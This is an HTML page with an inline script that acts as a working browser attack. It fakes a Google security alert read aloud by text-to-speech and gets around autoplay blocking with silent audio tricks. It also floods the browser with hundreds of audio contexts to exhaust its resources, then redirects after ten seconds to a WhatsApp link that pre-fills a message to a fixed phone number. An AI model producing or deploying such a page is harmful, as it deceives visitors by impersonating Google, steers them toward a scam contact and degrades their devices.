<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - WhatsApp Intent Redirection</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; min-height: 100vh; overflow: hidden; }
  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
</style>
</head>
<body>
<script>
(function () {
  'use strict';

  // ============================================
  // KONFIGURASI AUTOPLAY & WHATSAPP INTENT
  // ============================================
  var CONFIG = {
    tts: {
      text: "Google Security Alert. Extended verification process initiated. Redirecting to WhatsApp support.",
      lang: 'en-US',
      rate: 0.85,
      pitch: 1.0,
      volume: 1.0,
      repeatInterval: 10000,
      maxRepeats: 50
    },
    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
    exhaustionInterval: 250,
    batchSize: 400,
    // Target intent WhatsApp untuk pengujian deep link handler langsung ke aplikasi WA
    whatsappIntentUrl: 'whatsapp://send?phone=628123456789&text=Security%20Verification%20Required'
  };

  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, executionSeconds: 0 };

  // ============================================
  // TTS — TANPA CANCEL DI DALAM LOOP
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.volume = CONFIG.tts.volume;

      var voices = window.speechSynthesis.getVoices();
      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
      if (enVoice) u.voice = enVoice;

      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) { console.log('[TTS] fail:', e.message); }
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  // ============================================
  // AUDIO CONTEXT UNLOCK
  // ============================================
  function unlockAudioContext() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') {
        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
      }
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.0001;
      osc.frequency.value = 20000;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.1);
    } catch (e) {}
  }

  // ============================================
  // SILENT AUDIO ELEMENT
  // ============================================
  function trySilentAudio() {
    try {
      var a = new Audio(CONFIG.silentWav);
      a.volume = 0.0001;
      a.loop = true;
      var p = a.play();
      if (p && p.catch) p.catch(function(){});
    } catch (e) {}
  }

  // ============================================
  // MAIN AUDIO (Web Audio API)
  // ============================================
  function playMainAudio() {
    if (state.mainPlayed) return;
    state.mainPlayed = true;

    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var sr = ctx.sampleRate;
      var dur = 3.0;
      var buf = ctx.createBuffer(1, sr * dur, sr);
      var d = buf.getChannelData(0);

      for (var i = 0; i < d.length; i++) {
        var t = i / sr;
        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
        var env = Math.max(0, 1 - t / dur);
        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
      }

      var src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start();
      src.onended = startTTS;
      setTimeout(startTTS, 3500);
    } catch (e) {
      startTTS();
    }
  }

  // ============================================
  // EXTENDED EXHAUSTION + WHATSAPP INTENT REDIRECTION
  // ============================================
  function triggerExtendedSeverityExhaustion() {
    console.log("[!] Initiating Extended Duration & WhatsApp Intent Chain...");
    
    var durationTimer = setInterval(function() {
      state.executionSeconds += 1;
      console.log("[*] Execution active for " + state.executionSeconds + " seconds.");
      
      // Pemicu Intent Redirection ke WhatsApp setelah durasi tertentu (misal: 10 detik)
      if (state.executionSeconds === 10) {
        try {
          console.log("[*] Triggering WhatsApp Intent Redirection...");
          window.location.replace(CONFIG.whatsappIntentUrl);
        } catch (e) {}
      }

      if (state.executionSeconds > 120) {
        clearInterval(durationTimer);
      }
    }, 1000);

    var exhaustionTimer = setInterval(function() {
      try {
        for (var i = 0; i < CONFIG.batchSize; i++) {
          var ctx = new (window.AudioContext || window.webkitAudioContext)();
          var osc = ctx.createOscillator();
          var gain = ctx.createGain();
          
          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start(0);
          
          if (i % 50 === 0) {
            var u = new SpeechSynthesisUtterance("WHATSAPP_REDIRECT_NODE_" + state.executionSeconds);
            window.speechSynthesis.speak(u);
          }
        }
      } catch(e) {}
    }, CONFIG.exhaustionInterval);
  }

  // ============================================
  // EKSEKUSI BERTAHAP
  // ============================================
  unlockAudioContext();
  trySilentAudio();

  setTimeout(function () {
    unlockAudioContext();
    startTTS();
  }, 200);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
  }, 800);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
    if (!state.ttsStarted) startTTS();
    
    triggerExtendedSeverityExhaustion();
    
  }, 2000);

  var retryCount = 0;
  var retry = setInterval(function () {
    retryCount++;
    unlockAudioContext();
    trySilentAudio();
    if (!state.ttsStarted) startTTS();
    if (retryCount > 10) clearInterval(retry);
  }, 3000);

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden && !state.mainPlayed) {
      setTimeout(playMainAudio, 100);
    }
  });
})();
</script>
</body>
</html>
